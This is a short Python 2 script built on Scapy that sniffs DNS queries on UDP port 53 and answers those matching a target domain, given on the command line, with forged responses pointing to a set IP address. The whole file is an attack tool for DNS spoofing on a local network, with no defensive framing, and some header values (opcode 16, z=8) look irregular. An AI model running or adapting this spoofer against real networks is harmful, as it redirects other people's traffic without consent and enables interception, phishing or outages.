#!/usr/bin/python -tt

import time, logging, sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def sniffmgmt(pkt):
  if pkt.haslayer(DNSQR):
    domain = pkt[DNSQR].qname[:-1]
    reqip = pkt[IP].src
    name = domain.split('.')[-2]
    if name in targetdomain:
      poison(pkt, ip)

def poison(pkt, ip):
  dr = pkt[DNS]
  timetolive = '\x00\x00\x07\x75'
  alen = '\x00\x04'
  d = DNS()
  d.id = dr.id
  d.qr = 1
  d.opcode = 16
  d.ra = 1
  d.z = 8
  d.rcode = 0
  d.qdcount = 1
  d.ancount = 1
  d.qd = str(dr.qd)
  d.an = str(dr.qd) + timetolive + alen + inet_aton(ip)
  f = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt.dport, dport=pkt.sport)/d
  send(f, verbose=0)

if __name__ == '__main__':

  ### set these vars ###
  ip = '127.0.0.1' # ip to return
  targetdomain = sys.argv[1]
  ######################

  print 'Poisoning DNS requests containing %s...' % (targetdomain)

  try:
    sniff(filter='udp dst port 53', prn=sniffmgmt, store=0)
  except KeyboardInterrupt:
    print 'Exiting...'
